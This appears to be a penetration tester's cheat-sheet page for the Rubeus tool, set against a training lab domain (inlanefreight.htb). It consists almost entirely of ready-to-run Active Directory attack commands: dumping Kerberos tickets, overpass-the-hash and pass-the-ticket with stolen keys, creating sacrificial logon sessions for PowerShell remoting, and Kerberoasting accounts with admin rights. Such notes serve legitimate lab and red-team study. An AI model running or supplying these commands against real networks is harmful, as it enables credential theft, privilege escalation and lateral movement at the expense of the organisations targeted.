---
tags:
  - windows
  - kerberoasting
  - PtT
  - PtH
---
# Modules
## Dump Kerberos Ticket Data
```cmd-session
> Rubeus.exe dump /nowrap
```
`dump` to print the ticket in base64 (easy copy-paste)

# Pass the Key / OverPass the Hash
Use the module `asktgt` with username, domain, and hash (`/rc4`, `/aes128`, `/aes256`, or `/des`). The hash can be collected using [[Mimikatz]] `sekurlsa::ekeys`.
```cmd-session
> Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:<AES-KEY> /nowrap
```

Instead of retrieving the ticket in base64, we could use the flag `/ptt` to submit the ticket (TGT or TGS) to the current logon session.
```cmd-session
> Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:<RC4-HASH> /ptt
```
## Alternate Methods
1. Using harvested keys in `.kirbi`
We can import the ticket (created using Mimikatz [[Mimikatz#Export Tickets|Export Tickets]] module) into the current session.
```cmd-session
> Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
```
2. Pass base64 ticket
	- Convert `.kirbi` to Base64 Format
```powershell-session
PS > [Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
```
Now we can pass this base64 instead of filename
```cmd-session
> Rubeus.exe ptt /ticket:<BASE64-TICKET>
```
>**Note:** Mimikatz requires administrative rights for Pass the Key/OverPass the Hash attacks, while Rubeus doesn't.

# Powershell Remoting with PtT
The option `createnetonly` creates a sacrificial process/logon session ([Logon type 9](https://eventlogxp.com/blog/logon-type-what-does-it-mean/)) which is hidden by default, but can be displayed using `/show` (equivalent of `runas /netonly`). This prevents the erasure of existing TGTs for the current logon session.
```cmd-session
> Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```
This should open a new CMD window from where we can execute Rubeus to request a new TGT, using `ptt`, to import the ticket into the current session and connect to the DC using PS Remoting.
```powershell
PS > Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:<AES-KEY> /ptt
> powershell
PS > Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:<AES-KEY> /ptt
```
# Kerberoasting
## Gather Stats
```powershell
PS > .\Rubeus.exe kerberoast /stats
```
## Retrieve TGS Tickets
- Request tickets of accounts with `admincount=1` (high value targets):
```powershell
PS > .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```
- Request ticket for a specific user:
```powershell
PS > .\Rubeus.exe kerberoast /user:<USER> /nowrap
```
## Usefule Flags
- `/tgtdeleg`: Retrieve only `RC4` encrypted ticket (Does not work on Server 2019+)
